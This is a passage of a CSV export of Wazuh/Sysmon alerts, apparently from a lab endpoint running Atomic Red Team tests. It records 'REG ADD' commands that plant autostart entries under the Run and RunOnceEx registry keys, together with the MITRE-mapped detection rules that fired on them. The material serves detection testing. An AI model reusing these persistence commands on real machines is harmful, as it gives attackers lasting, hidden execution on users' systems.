(WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2025-12-29 10:27:57.604\r\nProcessGuid: {411eefe4-57ad-6952-7e18-000000001000}\r\nProcessId: 11192\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""cmd.exe"" /c REG ADD ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\\Path\\AtomicRedTeam.exe""\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-ab3e-6951-cb0d-000000001000}\r\nParentProcessId: 5948\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:27:57.6086729Z', 'eventRecordID': '18589', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 2, 'mail': False, 'level': 4, 'description': 'Windows command prompt started by an abnormal process', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92052'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:58.748Z', 'location': 'EventChannel', 'id': '1767004078.7342165', 'timestamp': '2025-12-29T11:27:58.748+0100'}",medium,"\""cmd.exe\"" /c REG ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\"""
2025-12-29T10:27:59.820Z,Endpoint3-Win,1,92041,Value added to registry key has Base64-like pattern,10,T1027;T1112,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'reg.exe', 'image': 'C:\\\\Windows\\\\System32\\\\reg.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-57ad-6952-7e18-000000001000}', 'description': 'Registry Console Tool', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': '\\""cmd.exe\\"" /c REG ADD \\""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\"" /V \\""Atomic Red Team\\"" /t REG_SZ /F /D \\""C:\\\\Path\\\\AtomicRedTeam.exe\\""', 'processGuid': '{411eefe4-57ad-6952-8018-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '11192', 'processId': '3604', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:27:57.756', 'hashes': 'SHA1=3922B8843F27EEC9BED40F54C888D683340E61F8,MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0', 'parentImage': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'ruleName': 'technique_id=T1012,technique_name=Query Registry', 'company': 'Microsoft Corporation', 'commandLine': 'REG  ADD \\""HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\"" /V \\""Atomic Red Team\\"" /t REG_SZ /F /D \\""C:\\\\Path\\\\AtomicRedTeam.exe\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.5074 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1012,technique_name=Query Registry\r\nUtcTime: 2025-12-29 10:27:57.756\r\nProcessGuid: {411eefe4-57ad-6952-8018-000000001000}\r\nProcessId: 3604\r\nImage: C:\\Windows\\System32\\reg.exe\r\nFileVersion: 10.0.26100.5074 (WinBuild.160101.0800)\r\nDescription: Registry Console Tool\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: reg.exe\r\nCommandLine: REG  ADD ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\\Path\\AtomicRedTeam.exe""\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=3922B8843F27EEC9BED40F54C888D683340E61F8,MD5=F6E3559DDDDCCC843A12CFD50178C554,SHA256=EF37663B44AC66920C6F33694DEEA01ACB78AE3F3012884819373FA04C3EB5F0,IMPHASH=2DC6AE94704E0DBEAFC5A2BB00BD87F0\r\nParentProcessGuid: {411eefe4-57ad-6952-7e18-000000001000}\r\nParentProcessId: 11192\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: ""cmd.exe"" /c REG ADD ""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"" /V ""Atomic Red Team"" /t REG_SZ /F /D ""C:\\Path\\AtomicRedTeam.exe""\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:27:57.7830311Z', 'eventRecordID': '18592', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': False, 'level': 10, 'description': 'Value added to registry key has Base64-like pattern', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Obfuscated Files or Information', 'Modify Registry'], 'id': ['T1027', 'T1112'], 'tactic': ['Defense Evasion']}, 'id': '92041'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:59.820Z', 'location': 'EventChannel', 'id': '1767004079.7348982', 'timestamp': '2025-12-29T11:27:59.820+0100'}",high,"REG  ADD \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /V \""Atomic Red Team\"" /t REG_SZ /F /D \""C:\\Path\\AtomicRedTeam.exe\"""
2025-12-29T10:27:59.832Z,Endpoint3-Win,1,92302,Registry entry to be executed on next logon was modified using command line application reg.exe,6,T1547.001,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'image': 'C:\\\\WINDOWS\\\\system32\\\\reg.exe', 'targetObject': 'HKU\\\\S-1-5-21-1194248728-2016982980-2923753283-1001\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Atomic Red Team', 'processGuid': '{411eefe4-57ad-6952-8018-000000001000}', 'processId': '3604', 'utcTime': '2025-12-29 10:27:57.821', 'ruleName': 'technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder', 'details': 'C:\\\\Path\\\\AtomicRedTeam.exe', 'eventType': 'SetValue', 'user': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '13', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Registry value set:\r\nRuleName: technique_id=T1547.001,technique_name=Registry Run Keys / Start Folder\r\nEventType: SetValue\r\nUtcTime: 2025-12-29 10:27:57.821\r\nProcessGuid: {411eefe4-57ad-6952-8018-000000001000}\r\nProcessId: 3604\r\nImage: C:\\WINDOWS\\system32\\reg.exe\r\nTargetObject: HKU\\S-1-5-21-1194248728-2016982980-2923753283-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Atomic Red Team\r\nDetails: C:\\Path\\AtomicRedTeam.exe\r\nUser: WINDOWSEND-C792\\ayoub""', 'version': '2', 'systemTime': '2025-12-29T10:27:57.8241419Z', 'eventRecordID': '18593', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '13', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 1, 'mail': False, 'level': 6, 'description': 'Registry entry to be executed on next logon was modified using command line application reg.exe', 'groups': ['sysmon', 'sysmon_eid13_detections', 'windows'], 'mitre': {'technique': ['Registry Run Keys / Startup Folder'], 'id': ['T1547.001'], 'tactic': ['Persistence', 'Privilege Escalation']}, 'id': '92302'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:27:59.832Z', 'location': 'EventChannel', 'id': '1767004079.7355924', 'timestamp': '2025-12-29T11:27:59.832+0100'}",medium,
2025-12-29T10:28:02.298Z,Endpoint3-Win,1,92052,Windows command prompt started by an abnormal process,4,T1059.003,EventChannel,"{'agent': {'ip': '192.168.100.15', 'name': 'Endpoint3-Win', 'id': '001'}, 'manager': {'name': 'wazuh-vm'}, 'data': {'win': {'eventdata': {'originalFileName': 'Cmd.Exe', 'image': 'C:\\\\Windows\\\\System32\\\\cmd.exe', 'product': 'Microsoft® Windows® Operating System', 'parentProcessGuid': '{411eefe4-ab3e-6951-cb0d-000000001000}', 'description': 'Windows Command Processor', 'logonGuid': '{411eefe4-28dc-6951-f5d2-0e0000000000}', 'parentCommandLine': 'C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'processGuid': '{411eefe4-57b1-6952-8318-000000001000}', 'logonId': '0xed2f5', 'parentProcessId': '5948', 'processId': '7204', 'currentDirectory': 'C:\\\\Users\\\\ayoub\\\\AppData\\\\Local\\\\Temp\\\\', 'utcTime': '2025-12-29 10:28:01.181', 'hashes': 'SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9', 'parentImage': 'C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe', 'ruleName': 'technique_id=T1059.003,technique_name=Windows Command Shell', 'company': 'Microsoft Corporation', 'commandLine': '\\""cmd.exe\\"" /c REG ADD HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnceEx\\\\0001\\\\Depend /v 1 /d \\""C:\\\\Path\\\\AtomicRedTeam.dll\\""', 'integrityLevel': 'High', 'fileVersion': '10.0.26100.7309 (WinBuild.160101.0800)', 'user': 'WINDOWSEND-C792\\\\ayoub', 'terminalSessionId': '1', 'parentUser': 'WINDOWSEND-C792\\\\ayoub'}, 'system': {'eventID': '1', 'keywords': '0x8000000000000000', 'providerGuid': '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', 'level': '4', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'opcode': '0', 'message': '""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2025-12-29 10:28:01.181\r\nProcessGuid: {411eefe4-57b1-6952-8318-000000001000}\r\nProcessId: 7204\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.7309 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: ""cmd.exe"" /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d ""C:\\Path\\AtomicRedTeam.dll""\r\nCurrentDirectory: C:\\Users\\ayoub\\AppData\\Local\\Temp\\\r\nUser: WINDOWSEND-C792\\ayoub\r\nLogonGuid: {411eefe4-28dc-6951-f5d2-0e0000000000}\r\nLogonId: 0xED2F5\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=583BAC245F14E4E07E7508692C5D8B97F9EB9E6D,MD5=6D109A3A00F210C1AB89C3B08399ED48,SHA256=64AFC6DB3AAD1289533662E2D79E27DD55C7DCDB8CD918B08E145AD82AD5ACB4,IMPHASH=B0F049C014592B156EB1FA857E99CEB9\r\nParentProcessGuid: {411eefe4-ab3e-6951-cb0d-000000001000}\r\nParentProcessId: 5948\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentUser: WINDOWSEND-C792\\ayoub""', 'version': '5', 'systemTime': '2025-12-29T10:28:01.1849665Z', 'eventRecordID': '18600', 'threadID': '3676', 'computer': 'WindowsEnd-c7921449-8b62-4c4d-8a83-d9281ac0190b', 'task': '1', 'processID': '1836', 'severityValue': 'INFORMATION', 'providerName': 'Microsoft-Windows-Sysmon'}}}, 'rule': {'firedtimes': 3, 'mail': False, 'level': 4, 'description': 'Windows command prompt started by an abnormal process', 'groups': ['sysmon', 'sysmon_eid1_detections', 'windows'], 'mitre': {'technique': ['Windows Command Shell'], 'id': ['T1059.003'], 'tactic': ['Execution']}, 'id': '92052'}, 'decoder': {'name': 'windows_eventchannel'}, 'input': {'type': 'log'}, '@timestamp': '2025-12-29T10:28:02.298Z', 'location': 'EventChannel', 'id': '1767004082.7359251', 'timestamp': '2025-12-29T11:28:02.298+0100'}",medium,"\""cmd.exe\"" /c REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \""C:\\Path\\AtomicRedTeam.dll\"""
